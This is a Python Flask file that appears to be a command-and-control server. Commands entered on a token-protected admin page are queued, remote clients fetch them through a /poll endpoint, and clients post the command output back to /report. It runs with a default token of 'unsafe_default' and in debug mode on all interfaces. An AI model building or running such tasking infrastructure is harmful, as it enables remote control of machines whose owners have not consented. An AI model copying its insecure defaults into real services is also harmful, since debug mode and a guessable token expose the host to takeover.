import os
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

SECRET_TOKEN = os.environ.get("SECRET_TOKEN", "unsafe_default")

cmd_queue = []
results = [] # Stores dictionaries now: {'cmd': 'ls', 'output': 'file1...'}

@app.route('/')
def index():
    return "<h3>Command Center Online</h3><a href='/admin'>Go to Admin</a>"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    global results
    error = None
    success = None
    token_val = ""

    if request.method == 'POST':
        token_val = request.form.get('token')
        cmd = request.form.get('cmd')

        if token_val != SECRET_TOKEN:
            error = "INVALID TOKEN"
        elif cmd:
            cmd_queue.append(cmd)
            success = cmd

    # This function looks for 'templates/index.html' automatically
    return render_template(
        'index.html', 
        results=results, 
        status_error=error, 
        status_success=success,
        token_value=token_val
    )

@app.route('/poll', methods=['GET'])
def poll():
    if request.headers.get('Authorization') != SECRET_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403
    
    if cmd_queue:
        return jsonify({"command": cmd_queue.pop(0)})
    return jsonify({"command": None})

@app.route('/report', methods=['POST'])
def report():
    if request.headers.get('Authorization') != SECRET_TOKEN:
        return jsonify({"error": "Unauthorized"}), 403
    
    data = request.json
    if data:
        # Store raw data, let HTML handle the formatting
        results.append({"cmd": data.get('cmd'), "output": data.get('output')})
    return "OK"

if __name__ == '__main__':
    # debug=True allows you to see changes instantly without restarting!
    app.run(host='0.0.0.0', port=5000, debug=True)
    